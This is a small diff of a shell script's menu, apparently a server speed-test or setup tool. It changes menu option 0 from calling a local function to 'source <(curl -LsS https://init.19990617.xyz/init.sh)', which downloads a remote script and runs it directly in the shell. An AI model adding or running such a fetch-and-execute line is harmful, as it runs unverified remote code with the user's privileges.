@@ -328,7 +328,7 @@ speed_test(){
                 break
                 ;;
             0)
-                yohann
+                source <(curl -LsS https://init.19990617.xyz/init.sh)
                 break
                 ;;
             *)
